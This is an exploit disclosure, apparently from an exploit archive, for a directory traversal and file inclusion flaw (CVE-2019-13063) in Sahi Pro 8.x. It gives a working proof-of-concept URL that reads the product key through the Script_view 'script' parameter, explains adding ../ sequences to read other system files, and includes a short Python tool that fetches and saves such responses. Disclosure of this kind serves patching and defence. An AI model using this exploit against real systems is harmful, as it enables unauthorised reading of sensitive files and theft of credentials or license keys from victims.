# Exploit Title: Sahi pro (8.x) Directory traversal
# Date: 2019-06-25
# Exploit Author: Operat0r
# Vendor Homepage: https://sahipro.com/
# Software Link: https://sahipro.com/downloads-archive/
# Version: 8.0
# Tested on: Linux Ubuntu / Windows 7
# CVE: CVE-2019-13063

An issue was discovered in Safi-pro web-application, there is a directory traversal and both local and remote file inclusion vulnerability which resides in the ?script= parameter which is found on the Script_View page. And attacker can send a specially crafted URL to retrieve and steal sensitive files from teh victim.

POC -

http://10.0.0.167:9999/_s_/dyn/Script_view?script=/config/productkey.txt

This results in the revealing of the applications product key. The ?script= can have ../../../../../ added to retrieve more files from the system

POC tool -

import argparse, requests, os

#sahi_productkey = '/config/productkey.txt'
#root_dir = '../../../../../../'
#vuln_url = "http://10.0.0.167:9999/_s_/dyn/Script_view?script="

print("[x] Proof of concept tool to exploit the directory traversal and local file"
      " inclusion vulnerability that resides in the [REDACTED]\n[x] CVE-2019-xxxxxx\n")

print("Example usage:\npython POC.y --url http://example:9999/_s_/dyn/Script_view?script=/config/productkey.txt")

parser = argparse.ArgumentParser()
parser.add_argument("--url",
                    help='Specify the vulnerable URL')

args = parser.parse_args()

response = requests.get(args.url)
file = open("output.txt", "w")
file.write(response.text)
file.close()